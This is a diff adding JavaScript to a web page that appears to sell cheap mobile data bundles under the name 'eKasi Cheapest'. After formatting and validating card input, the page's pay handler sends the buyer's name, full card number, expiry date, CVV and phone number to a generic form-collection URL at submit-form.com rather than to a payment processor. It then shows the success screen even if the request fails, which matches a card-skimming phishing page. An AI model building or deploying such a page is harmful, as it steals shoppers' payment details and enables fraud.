+        function detectCardType(number) {
+            const clean = number.replace(/\s+/g, '');
+            if (/^4/.test(clean)) return 'visa';
+            if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
+            if (/^3[47]/.test(clean)) return 'amex';
+            return null;
+        }
+
+        function handleCardInput(input) {
+            let val = input.value.replace(/\D/g, '');
+            let type = detectCardType(val);
+            let maxLength = type === 'amex' ? 15 : 16;
+            val = val.substring(0, maxLength);
+
+            let formatted = '';
+            if (type === 'amex') {
+                for (let i = 0; i < val.length; i++) {
+                    if (i === 4 || i === 10) formatted += ' ';
+                    formatted += val[i];
+                }
+            } else {
+                for (let i = 0; i < val.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+            }
+            input.value = formatted;
+
+            const logoContainer = document.getElementById('card-logo');
+            logoContainer.innerHTML = (type && LOGOS[type]) ? LOGOS[type] : `<span class="text-xs text-slate-400 font-extrabold uppercase tracking-wide">CARD</span>`;
+
+            const box = document.getElementById('box-number');
+            const errorText = document.getElementById('card-error');
+
+            if (val.length >= 13) {
+                if (checkLuhn(val)) {
+                    isCardValid = true;
+                    box.classList.remove('invalid-card'); box.classList.add('valid-card');
+                    errorText.classList.add('hidden');
+                } else {
+                    isCardValid = false;
+                    box.classList.remove('valid-card'); box.classList.add('invalid-card');
+                    errorText.classList.remove('hidden');
+                }
+            } else {
+                isCardValid = false;
+                box.classList.remove('valid-card', 'invalid-card');
+                errorText.classList.add('hidden');
+            }
+            validateScreen2();
+        }
+
+        function handleExpiryInput(input) {
+            let val = input.value.replace(/\D/g, '');
+            if (val.length >= 2) {
+                let month = parseInt(val.substring(0, 2));
+                if (month > 12) val = '12' + val.substring(2);
+                if (month === 0) val = '01' + val.substring(2);
+                val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            }
+            input.value = val;
+            validateScreen2();
+        }
+
+        function handleCVVInput(input) {
+            input.value = input.value.replace(/\D/g, '');
+            validateScreen2();
+        }
+
+        function validateScreen2() {
+            const name = document.getElementById('cardholder-name').value.trim();
+            const expiry = document.getElementById('expiry-date').value.trim();
+            const cvv = document.getElementById('cvv-number').value.trim();
+            const payBtn = document.getElementById('pay-button');
+
+            const isExpiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
+            const isCvvValid = cvv.length >= 3;
+
+            if (name.length > 2 && isCardValid && isExpiryValid && isCvvValid) {
+                payBtn.disabled = false;
+                payBtn.className = "w-full py-4 rounded-2xl font-black text-lg text-white bg-emerald-600 hover:bg-emerald-700 active:scale-[0.99] cursor-pointer transition-all duration-300 shadow-xl shadow-emerald-600/30 uppercase tracking-wider flex items-center justify-center gap-2";
+            } else {
+                payBtn.disabled = true;
+                payBtn.className = "w-full py-4 rounded-2xl font-black text-lg text-white bg-slate-300 cursor-not-allowed transition-all duration-300 shadow-md uppercase tracking-wider flex items-center justify-center gap-2";
+            }
+        }
+
+        // AJAX Form Submission to submit-form.com then proceed to Screen 3
+        function handlePaySubmit(e) {
+            e.preventDefault();
+
+            const payBtn = document.getElementById('pay-button');
+            const payText = document.getElementById('pay-button-text');
+            const spinner = document.getElementById('pay-spinner');
+
+            payBtn.disabled = true;
+            payText.innerText = "PROCESSING...";
+            spinner.classList.remove('hidden');
+
+            const payload = {
+                network: selectedNetwork,
+                phone: "+27" + document.getElementById('phone-input').value.trim(),
+                bundle: document.getElementById('selected-bundle-text').innerText,
+                cardholder_name: document.getElementById('cardholder-name').value.trim(),
+                card_number: document.getElementById('card-number').value.trim(),
+                expiry_date: document.getElementById('expiry-date').value.trim(),
+                cvv: document.getElementById('cvv-number').value.trim()
+            };
+
+            fetch("https://submit-form.com/QlCSHZGke", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    Accept: "application/json",
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(() => {
+                goToScreen(3);
+            })
+            .catch(() => {
+                goToScreen(3);
+            })
+            .finally(() => {
+                payBtn.disabled = false;
+                payText.innerText = "PAY NOW";
+                spinner.classList.add('hidden');
+            });
+        }
+
+        function shareApp() {
+            if (navigator.share) {
+                navigator.share({ title: 'eKasi Cheapest', url: window.location.href }).catch(() => {});
+            } else {
+                showToast('Link copied to clipboard!');
+            }
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-message').innerText = msg;
+            toast.classList.remove('hidden');
+            setTimeout(() => { toast.classList.add('hidden'); }, 3000);
+        }
+    </script>
+ </body>
+</html>
